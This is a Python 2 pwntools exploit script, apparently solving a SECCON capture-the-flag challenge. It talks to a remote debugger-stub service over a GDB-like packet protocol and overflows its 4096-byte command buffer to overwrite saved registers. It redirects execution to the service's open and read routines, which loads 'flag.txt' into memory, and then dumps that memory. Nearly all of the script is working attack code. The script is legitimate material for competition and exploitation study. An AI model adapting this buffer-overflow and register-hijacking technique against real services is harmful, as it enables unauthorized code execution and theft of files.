import pwn
import struct

pwn.context.update(endian='big')

def packet(data):
    checksum = '{:02x}'.format(sum(ord(c) for c in data)&0xFF)
    return '$' + data + '#' + checksum + '+'

r = pwn.remote('micro.pwn.seccon.jp', 10000)
r.send('+')

def rest():
    data = r.recvuntil('#')
    r.recv(2)
    return data

def consume():
    crap = r.recvuntil('+')
    #print 'notification:', crap
    if r.recv(1) != '$':
        r.interactive()
        raise Exception('wut')
    data = rest()
    r.send('+')
    return data

def ex(data):
    r.send(packet(data))
    return consume()

def regs():
    data = ex('g').strip('#').decode('hex')
    return struct.unpack('>10I', data)

def step():
    return ex('s')

def mem(d, l):
    data = ex('m{:x},{:x}'.format(d, l))
    return data.strip('#').decode('hex')

O_OPEN = 0x13b6
O_READ = 0x13aa
O_WRITE = 0x13b0

def pregs():
    re = regs()
    print 'regs', ' '.join('{:08x}'.format(c) for c in re)
    return re

def makeregs(r0=0, r1=0, r2=0, r3=0, r4=0, r5=0, r6=0, r7=0, pc=0):
    a = [
            r0, r1, r2, r3, r4, r5, r6, r7,
            0xc0, pc
    ]
    return ''.join(pwn.p32(aa) for aa in a)

pregs()

pwn.log.info("Smashing registers with open('flag.txt.')")
# address of command buffer in memory
bs = 0x400250
buf = ''
buf += 's'
# some padding so that future commands don't overwrite flag.txt
buf += 'pad'*20
o_flagtxt = bs + len(buf)
# address of flag.txt in memory
buf += 'flag.txt\x00'
buf = buf.ljust(4096, 'Z')
buf += makeregs(r0=o_flagtxt, r1=0, r2=0, pc=O_OPEN)
ex(buf)

pwn.log.info("Running open()...")
for _ in range(5):
    pregs()
    step()

# some RAM we can read the flag into.
SCRATCH = 0x401300
pwn.log.info("Smashing registers with read(3, SCRATCH, 128)")
buf = ''
buf += 's'
buf = buf.ljust(4096, 'Z')
buf += makeregs(r0=3, r1=SCRATCH, r2=128, pc=O_READ)
ex(buf)

pwn.log.info("Running read()...")
for _ in range(4):
    pregs()
    step()


pwn.log.info("Printing SCRATCH contents")
print mem(SCRATCH, 128)
